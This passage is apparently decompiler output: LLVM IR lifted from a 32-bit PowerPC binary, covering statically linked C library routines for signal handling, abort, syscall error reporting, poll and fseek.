  %stack_var_-300 = alloca i32, align 4
  %v0_100091d8 = load i32, i32* @lr, align 4
  store i32 %v0_100091d8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100091e4 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_100091f4 = add i32 %tmp, 4
  store i32 %v1_100091f4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_100091fc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_100091fc, i32* @r3, align 4
  br i1 %v3_100091e4, label %dec_label_pc_10009224, label %dec_label_pc_10009204

dec_label_pc_10009204:                            ; preds = %entry
  %v2_10009204 = load i32, i32* %arg2, align 4
  store i32 %v2_10009204, i32* %r0.global-to-local, align 4
  store i32 268472848, i32* @lr, align 4
  %v0_1000920c = call i32 @memcpy()
  %v0_10009210 = load i32, i32* @r31, align 4
  %v1_10009210 = add i32 %v0_10009210, 132
  %v2_10009210 = inttoptr i32 %v1_10009210 to i32*
  %v3_10009210 = load i32, i32* %v2_10009210, align 4
  store i32 %v3_10009210, i32* %r0.global-to-local, align 4
  %v1_1000921c = add i32 %v0_10009210, 136
  %v2_1000921c = inttoptr i32 %v1_1000921c to i32*
  %v3_1000921c = load i32, i32* %v2_1000921c, align 4
  store i32 %v3_1000921c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10009224

dec_label_pc_10009224:                            ; preds = %entry, %dec_label_pc_10009204
  store i32 268472900, i32* @lr, align 4
  %v0_10009240 = call i32 @__syscall_rt_sigaction()
  %v0_10009244 = load i32, i32* %r30.global-to-local, align 4
  %v3_10009244 = icmp eq i32 %v0_10009244, 0
  store i32 %v0_10009240, i32* @r31, align 4
  br i1 %v3_10009244, label %dec_label_pc_10009280, label %dec_label_pc_10009254

dec_label_pc_10009254:                            ; preds = %dec_label_pc_10009224
  %v1_1000924c = icmp slt i32 %v0_10009240, 0
  %v1_10009254 = add i32 %v0_10009244, 4
  store i32 %v1_10009254, i32* @r3, align 4
  %v2_10009258 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_10009258, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000924c, label %dec_label_pc_10009280, label %dec_label_pc_10009264

dec_label_pc_10009264:                            ; preds = %dec_label_pc_10009254
  %v3_10009264 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10009264, i32* %r0.global-to-local, align 4
  %v2_10009268 = inttoptr i32 %v0_10009244 to i32*
  store i32 %v3_10009264, i32* %v2_10009268, align 4
  store i32 268472944, i32* @lr, align 4
  %v0_1000926c = call i32 @memcpy()
  %v1_10009278 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009278 = add i32 %v1_10009278, 136
  %v3_10009278 = inttoptr i32 %v2_10009278 to i32*
  %v0_1000927c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000927c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000927c = add i32 %v1_1000927c, 132
  %v3_1000927c = inttoptr i32 %v2_1000927c to i32*
  store i32 %v0_1000927c, i32* %v3_1000927c, align 4
  %v0_10009284.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009280

dec_label_pc_10009280:                            ; preds = %dec_label_pc_10009254, %dec_label_pc_10009224, %dec_label_pc_10009264
  %v0_10009284 = phi i32 [ %v0_10009240, %dec_label_pc_10009254 ], [ %v0_10009240, %dec_label_pc_10009224 ], [ %v0_10009284.pre, %dec_label_pc_10009264 ]
  store i32 %v0_100091d8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009284

; uselistorder directives
  uselistorder i32 %v0_10009240, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10009280, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009224, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_10009298 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_10009298, label %dec_label_pc_100092c4, label %dec_label_pc_100092b4

dec_label_pc_100092b4:                            ; preds = %entry
  %tmp21 = icmp slt i32 %arg1, 1
  br i1 %tmp21, label %dec_label_pc_100092c4, label %dec_label_pc_100092bc

dec_label_pc_100092bc:                            ; preds = %dec_label_pc_100092b4
  %tmp22 = icmp slt i32 %arg1, 65
  br i1 %tmp22, label %dec_label_pc_100092f4.lr.ph, label %dec_label_pc_100092c4

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_100092bc, %dec_label_pc_100092b4, %entry
  %v0_100092c4 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100092d0 = inttoptr i32 %v0_100092c4 to i32*
  store i32 22, i32* %v2_100092d0, align 4
  %v0_10009364.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009360

dec_label_pc_100092f4.lr.ph:                      ; preds = %dec_label_pc_100092bc
  %v2_100092e4 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100092e4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_100092f423 = add i32 %v2_100092e4, 128
  %v3_100092f424 = inttoptr i32 %v2_100092f423 to i32*
  store i32 0, i32* %v3_100092f424, align 4
  %v0_100092f825 = load i32, i32* %r11.global-to-local, align 4
  %v1_100092f826 = add i32 %v0_100092f825, -1
  store i32 %v1_100092f826, i32* %r11.global-to-local, align 4
  %v1_100092fc27 = mul i32 %v1_100092f826, 4
  %v1_1000930028 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000930029 = add i32 %v1_1000930028, %v1_100092fc27
  store i32 %v2_1000930029, i32* %r9.global-to-local, align 4
  %v0_1000930430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000930431 = add i32 %v0_1000930430, -1
  store i32 %v1_1000930431, i32* %ctr.global-to-local, align 4
  %v2_1000930432 = icmp eq i32 %v1_1000930431, 0
  br i1 %v2_1000930432, label %dec_label_pc_10009308, label %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge

dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge: ; preds = %dec_label_pc_100092f4.lr.ph, %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge
  %v2_1000930033 = phi i32 [ %v2_10009300, %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge ], [ %v2_1000930029, %dec_label_pc_100092f4.lr.ph ]
  %v0_100092f4.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_100092f4 = add i32 %v2_1000930033, 4
  %v3_100092f4 = inttoptr i32 %v2_100092f4 to i32*
  store i32 %v0_100092f4.pre, i32* %v3_100092f4, align 4
  %v0_100092f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100092f8 = add i32 %v0_100092f8, -1
  store i32 %v1_100092f8, i32* %r11.global-to-local, align 4
  %v1_100092fc = mul i32 %v1_100092f8, 4
  %v1_10009300 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009300 = add i32 %v1_10009300, %v1_100092fc
  store i32 %v2_10009300, i32* %r9.global-to-local, align 4
  %v0_10009304 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009304 = add i32 %v0_10009304, -1
  store i32 %v1_10009304, i32* %ctr.global-to-local, align 4
  %v2_10009304 = icmp eq i32 %v1_10009304, 0
  br i1 %v2_10009304, label %dec_label_pc_10009308, label %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge

dec_label_pc_10009308:                            ; preds = %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge, %dec_label_pc_100092f4.lr.ph
  %v2_10009300.lcssa = phi i32 [ %v2_1000930029, %dec_label_pc_100092f4.lr.ph ], [ %v2_10009300, %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge ]
  %v0_1000930c.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_10009308 = ptrtoint i32* %stack_var_-292 to i32
  %v3_10009310 = call i32 @__sigaddset(i32 %v2_10009308, i32 %v0_1000930c.pre, i32 %v2_10009300.lcssa)
  %v1_10009314 = icmp slt i32 %v3_10009310, 0
  br i1 %v1_10009314, label %dec_label_pc_1000935c, label %dec_label_pc_1000931c

dec_label_pc_1000931c:                            ; preds = %dec_label_pc_10009308
  %v0_10009320 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009328 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1001ff00.457 to i32), i32 %v0_10009320)
  %v2_10009334 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268473164, i32* @lr, align 4
  %v4_10009348 = call i32 @__libc_sigaction(i32 %v0_10009320, i32* nonnull %stack_var_-296, i32 %v2_10009334)
  %v1_1000934c = icmp slt i32 %v4_10009348, 0
  br i1 %v1_1000934c, label %dec_label_pc_1000935c, label %dec_label_pc_10009354

dec_label_pc_10009354:                            ; preds = %dec_label_pc_1000931c
  %v3_10009354 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_10009354, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009360

dec_label_pc_1000935c:                            ; preds = %dec_label_pc_1000931c, %dec_label_pc_10009308
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009360

dec_label_pc_10009360:                            ; preds = %dec_label_pc_10009354, %dec_label_pc_100092c4, %dec_label_pc_1000935c
  %v0_10009364 = phi i32 [ %v3_10009354, %dec_label_pc_10009354 ], [ %v0_10009364.pre, %dec_label_pc_100092c4 ], [ -1, %dec_label_pc_1000935c ]
  ret i32 %v0_10009364

; uselistorder directives
  uselistorder i32 %v1_10009304, { 1, 0 }
  uselistorder i32 %v2_10009300, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009360, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100092f4.dec_label_pc_100092f4_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10009378 = add i32 %arg2, -1
  %v1_1000937c = call i32 @__asm_rlwinm(i32 %v1_10009378, i32 29, i32 3, i32 29)
  %v1_10009380 = urem i32 %v1_10009378, 32
  %v2_10009384 = add i32 %v1_1000937c, %arg1
  %v3_10009384 = inttoptr i32 %v2_10009384 to i32*
  %v4_10009384 = load i32, i32* %v3_10009384, align 4
  %v3_1000938c = shl i32 1, %v1_10009380
  %v2_10009390 = and i32 %v4_10009384, %v3_1000938c
  %v2_10009394 = icmp ne i32 %v2_10009390, 0
  %v5_10009398 = zext i1 %v2_10009394 to i32
  ret i32 %v5_10009398
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_100093a0 = add i32 %arg2, -1
  %v1_100093a8 = call i32 @__asm_rlwinm(i32 %v1_100093a0, i32 29, i32 3, i32 29)
  %v1_100093ac = urem i32 %v1_100093a0, 32
  %v2_100093b0 = add i32 %v1_100093a8, %arg1
  %v3_100093b0 = inttoptr i32 %v2_100093b0 to i32*
  %v4_100093b0 = load i32, i32* %v3_100093b0, align 4
  %v3_100093b4 = shl i32 1, %v1_100093ac
  %v2_100093b8 = or i32 %v3_100093b4, %v4_100093b0
  store i32 %v2_100093b8, i32* %v3_100093b0, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_100093c8 = add i32 %arg2, -1
  %v1_100093d0 = call i32 @__asm_rlwinm(i32 %v1_100093c8, i32 29, i32 3, i32 29)
  %v1_100093d4 = urem i32 %v1_100093c8, 32
  %v2_100093d8 = add i32 %v1_100093d0, %arg1
  %v3_100093d8 = inttoptr i32 %v2_100093d8 to i32*
  %v4_100093d8 = load i32, i32* %v3_100093d8, align 4
  %v3_100093dc = shl i32 -2, %v1_100093d4
  %v4_100093dc = sub nsw i32 32, %v1_100093d4
  %v5_100093dc = lshr i32 -2, %v4_100093dc
  %v6_100093dc = or i32 %v5_100093dc, %v3_100093dc
  %v2_100093e0 = and i32 %v6_100093dc, %v4_100093d8
  store i32 %v2_100093e0, i32* %v3_100093d8, align 4
  ret i32 0
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009424.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_10009408 = call i32 @__pthread_return_0()
  %v2_10009410 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10009410, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000942834 = add i32 %v2_10009410, 124
  %v4_1000942835 = inttoptr i32 %v3_1000942834 to i32*
  store i32 0, i32* %v4_1000942835, align 4
  %v0_1000942c36 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000942c37 = add i32 %v0_1000942c36, -1
  store i32 %v1_1000942c37, i32* %r9.global-to-local, align 4
  %v0_1000943038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000943039 = add i32 %v0_1000943038, -1
  store i32 %v1_1000943039, i32* %ctr.global-to-local, align 4
  %v2_1000943040 = icmp eq i32 %v1_1000943039, 0
  br i1 %v2_1000943040, label %dec_label_pc_10009434, label %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge

dec_label_pc_10009424.dec_label_pc_10009424_crit_edge: ; preds = %dec_label_pc_10009424.lr.ph, %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge
  %v1_1000942c41 = phi i32 [ %v1_1000942c, %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge ], [ %v1_1000942c37, %dec_label_pc_10009424.lr.ph ]
  %v0_10009428.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10009428.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10009424 = mul i32 %v1_1000942c41, 4
  %v3_10009428 = add i32 %v1_10009424, %v1_10009428.pre
  %v4_10009428 = inttoptr i32 %v3_10009428 to i32*
  store i32 %v0_10009428.pre, i32* %v4_10009428, align 4
  %v0_1000942c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000942c = add i32 %v0_1000942c, -1
  store i32 %v1_1000942c, i32* %r9.global-to-local, align 4
  %v0_10009430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009430 = add i32 %v0_10009430, -1
  store i32 %v1_10009430, i32* %ctr.global-to-local, align 4
  %v2_10009430 = icmp eq i32 %v1_10009430, 0
  br i1 %v2_10009430, label %dec_label_pc_10009434, label %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge

dec_label_pc_10009434:                            ; preds = %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge, %dec_label_pc_10009424.lr.ph
  %v1_1000942c.lcssa = phi i32 [ %v1_1000942c37, %dec_label_pc_10009424.lr.ph ], [ %v1_1000942c, %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge ]
  %v3_1000943c = call i32 @__sigaddset(i32 %v2_10009410, i32 6, i32 %v1_1000942c.lcssa)
  %v3_10009440 = icmp eq i32 %v3_1000943c, 0
  br i1 %v3_10009440, label %dec_label_pc_10009448, label %dec_label_pc_10009458

dec_label_pc_10009448:                            ; preds = %dec_label_pc_10009434
  store i32 268473432, i32* @lr, align 4
  %v3_10009454 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10009410, i32 0)
  br label %dec_label_pc_10009458

dec_label_pc_10009458:                            ; preds = %dec_label_pc_10009434, %dec_label_pc_10009448
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000945c = load i32, i32* @global_var_1001d890.460, align 4
  %v3_10009460 = icmp eq i32 %v3_1000945c, 0
  br i1 %v3_10009460, label %dec_label_pc_10009468, label %dec_label_pc_10009490

dec_label_pc_10009468:                            ; preds = %dec_label_pc_10009458
  store i32 1, i32* @global_var_1001d890.460, align 4
  br label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_100094ec, %dec_label_pc_10009468
  store i32 ptrtoint (i32* @global_var_1001d7b0.458 to i32), i32* %r29.global-to-local, align 4
  %v0_1000947c = call i32 @__pthread_return_0()
  store i32 268473480, i32* @lr, align 4
  %v1_10009484 = call i32 @__raise(i32 6)
  %v0_1000948c = call i32 @__pthread_return_0()
  %v3_10009494.pre = load i32, i32* @global_var_1001d890.460, align 4
  br label %dec_label_pc_10009490

dec_label_pc_10009490:                            ; preds = %dec_label_pc_10009458, %dec_label_pc_10009470
  %v0_10009508 = phi i32 [ %v3_1000945c, %dec_label_pc_10009458 ], [ %v3_10009494.pre, %dec_label_pc_10009470 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009498 = icmp eq i32 %v0_10009508, 1
  br i1 %v3_10009498, label %dec_label_pc_100094d8.lr.ph, label %dec_label_pc_10009508

dec_label_pc_100094d8.lr.ph:                      ; preds = %dec_label_pc_10009490
  %v2_100094a4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1001d890.460, align 4
  store i32 ptrtoint (i32* @global_var_100094b8.462 to i32), i32* @lr, align 4
  %v3_100094b4 = call i32 @__GI_memset(i32 %v2_100094a4, i32 0, i32 140)
  store i32 %v2_10009410, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000942834, i32* %r9.global-to-local, align 4
  %v2_100094e026 = add i32 %v2_10009410, 256
  %v3_100094e027 = inttoptr i32 %v2_100094e026 to i32*
  store i32 -1, i32* %v3_100094e027, align 4
  %v0_100094e428 = load i32, i32* %r11.global-to-local, align 4
  %v1_100094e429 = add i32 %v0_100094e428, -1
  store i32 %v1_100094e429, i32* %r11.global-to-local, align 4
  %v0_100094e830 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100094e831 = add i32 %v0_100094e830, -1
  store i32 %v1_100094e831, i32* %ctr.global-to-local, align 4
  %v2_100094e832 = icmp eq i32 %v1_100094e831, 0
  br i1 %v2_100094e832, label %dec_label_pc_100094ec, label %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge

dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge: ; preds = %dec_label_pc_100094d8.lr.ph, %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge
  %v1_100094e433 = phi i32 [ %v1_100094e4, %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge ], [ %v1_100094e429, %dec_label_pc_100094d8.lr.ph ]
  %v1_100094dc.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_100094e0.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100094d8 = mul i32 %v1_100094e433, 4
  %v2_100094dc = add i32 %v1_100094d8, %v1_100094dc.pre
  store i32 %v2_100094dc, i32* %r9.global-to-local, align 4
  %v2_100094e0 = add i32 %v2_100094dc, 132
  %v3_100094e0 = inttoptr i32 %v2_100094e0 to i32*
  store i32 %v0_100094e0.pre, i32* %v3_100094e0, align 4
  %v0_100094e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100094e4 = add i32 %v0_100094e4, -1
  store i32 %v1_100094e4, i32* %r11.global-to-local, align 4
  %v0_100094e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100094e8 = add i32 %v0_100094e8, -1
  store i32 %v1_100094e8, i32* %ctr.global-to-local, align 4
  %v2_100094e8 = icmp eq i32 %v1_100094e8, 0
  br i1 %v2_100094e8, label %dec_label_pc_100094ec, label %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge

dec_label_pc_100094ec:                            ; preds = %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge, %dec_label_pc_100094d8.lr.ph
  store i32 268473604, i32* @lr, align 4
  %v4_10009500 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10009470

dec_label_pc_10009508:                            ; preds = %dec_label_pc_10009490
  %v3_10009508 = icmp eq i32 %v0_10009508, 2
  br i1 %v3_10009508, label %dec_label_pc_10009510, label %dec_label_pc_1000951c

dec_label_pc_10009510:                            ; preds = %dec_label_pc_10009508
  store i32 3, i32* @global_var_1001d890.460, align 4
  br label %dec_label_pc_1000951c

dec_label_pc_1000951c:                            ; preds = %dec_label_pc_10009508, %dec_label_pc_10009510
  %v3_1000951c = phi i32 [ %v0_10009508, %dec_label_pc_10009508 ], [ 3, %dec_label_pc_10009510 ]
  %v1_10009524 = icmp ne i32 %v3_1000951c, 3
  call void @__pseudo_cond_branch(i1 %v1_10009524, i32 268473656)
  store i32 4, i32* @global_var_1001d890.460, align 4
  %v1_10009534 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10009534

; uselistorder directives
  uselistorder i32 %v1_100094e8, { 1, 0 }
  uselistorder i32 %v1_100094e4, { 1, 0 }
  uselistorder i32 %v1_10009430, { 1, 0 }
  uselistorder i32 %v1_1000942c, { 0, 2, 1 }
  uselistorder i32 %v2_10009410, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 5, 0, 1, 9, 8, 4, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_1001d890.460, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 26, 27, 20, 0, 21, 22, 1, 31, 3, 2, 12, 4, 23, 24, 15, 16, 17, 25, 28, 29, 30, 18, 19, 13, 5, 8, 6, 7, 14, 9, 10, 11 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 2, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__sigaddset, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1000951c, { 1, 0 }
  uselistorder label %dec_label_pc_100094d8.dec_label_pc_100094d8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009490, { 1, 0 }
  uselistorder label %dec_label_pc_10009458, { 1, 0 }
  uselistorder label %dec_label_pc_10009424.dec_label_pc_10009424_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10009540 = add i32 %arg1, 28
  %v2_10009540 = inttoptr i32 %v1_10009540 to i32*
  %v3_10009540 = load i32, i32* %v2_10009540, align 4
  store i32 %v3_10009540, i32* @global_var_1001d894.463, align 4
  %v1_10009550 = add i32 %arg1, 44
  %v2_10009550 = inttoptr i32 %v1_10009550 to i32*
  %v3_10009550 = load i32, i32* %v2_10009550, align 4
  store i32 %v3_10009550, i32* @global_var_1001d898.464, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10009568 = load i32, i32* @r3, align 4
  store i32 %v0_10009568, i32* @r29, align 4
  %v0_10009570 = call i32 @__errno_location()
  %v0_10009574 = load i32, i32* @r29, align 4
  %v2_10009574 = inttoptr i32 %v0_10009570 to i32*
  store i32 %v0_10009574, i32* %v2_10009574, align 4
  ret i32 -1
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1001d89c.424, align 4
  %v0_100095b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_100095b8)
  store i32 12, i32* @r3, align 4
  %v0_100095c0 = call i32 @__syscall_error()
  ret i32 %v0_100095c0

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 1, 0 }
  uselistorder i32* @global_var_1001d89c.424, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100095dc = call i32 @__asm_mfcr()
  %v1_100095e0 = and i32 %v0_100095dc, 268435456
  %v3_100095e0 = icmp eq i32 %v1_100095e0, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_100095dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100095e0, label %dec_label_pc_100095f8, label %dec_label_pc_100095ec

dec_label_pc_100095ec:                            ; preds = %entry
  %v0_100095ec = call i32 @__errno_location()
  %v0_100095f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100095f0 = inttoptr i32 %v0_100095ec to i32*
  store i32 %v0_100095f0, i32* %v2_100095f0, align 4
  br label %dec_label_pc_100095f8

dec_label_pc_100095f8:                            ; preds = %entry, %dec_label_pc_100095ec
  %v0_10009608 = phi i32 [ %v0_100095dc, %entry ], [ -1, %dec_label_pc_100095ec ]
  ret i32 %v0_10009608

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_100095f8, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009624 = call i32 @__asm_mfcr()
  %v1_10009628 = and i32 %v0_10009624, 268435456
  %v3_10009628 = icmp eq i32 %v1_10009628, 0
  store i32 %v0_10009624, i32* %r31.global-to-local, align 4
  br i1 %v3_10009628, label %dec_label_pc_10009640, label %dec_label_pc_10009634

dec_label_pc_10009634:                            ; preds = %entry
  %v0_10009634 = call i32 @__errno_location()
  %v0_10009638 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009638 = inttoptr i32 %v0_10009634 to i32*
  store i32 %v0_10009638, i32* %v2_10009638, align 4
  br label %dec_label_pc_10009640

dec_label_pc_10009640:                            ; preds = %entry, %dec_label_pc_10009634
  %v0_10009650 = phi i32 [ %v0_10009624, %entry ], [ -1, %dec_label_pc_10009634 ]
  ret i32 %v0_10009650

; uselistorder directives
  uselistorder label %dec_label_pc_10009640, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10009654 = load i32, i32* @r5, align 4
  store i32 %v0_10009654, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_1000965c = zext i1 %tmp to i32
  %v2_1000965c = ashr i32 %arg1, 31
  %v3_1000965c = and i32 %v2_1000965c, -2
  %v4_1000965c = or i32 %v3_1000965c, %v1_1000965c
  %v3_10009660 = inttoptr i32 %v4_1000965c to i16*
  %v4_10009660 = call i32 @__GI_fseeko64(i16* %v3_10009660, i32 %arg1, i32 %v0_10009654)
  ret i32 %v4_10009660

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10009664 = load i32, i32* @r7, align 4
  %v0_10009668 = load i32, i32* @lr, align 4
  store i32 %v0_10009668, i32* %r0.global-to-local, align 4
  store i32 %v0_10009664, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10009664, 3
  br i1 %tmp9, label %dec_label_pc_100096a0, label %dec_label_pc_1000968c

dec_label_pc_1000968c:                            ; preds = %entry
  %v0_1000968c = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10009698 = inttoptr i32 %v0_1000968c to i32*
  store i32 22, i32* %v2_10009698, align 4
  br label %dec_label_pc_10009768

dec_label_pc_100096a0:                            ; preds = %entry
  %v2_100096a0 = add i32 %tmp, 52
  %v3_100096a0 = inttoptr i32 %v2_100096a0 to i32*
  %v4_100096a0 = load i32, i32* %v3_100096a0, align 4
  store i32 %v4_100096a0, i32* @r28, align 4
  %v3_100096a4 = icmp eq i32 %v4_100096a0, 0
  br i1 %v3_100096a4, label %dec_label_pc_100096ac, label %dec_label_pc_100096cc

dec_label_pc_100096ac:                            ; preds = %dec_label_pc_100096a0
  %v2_100096ac = add i32 %tmp, 56
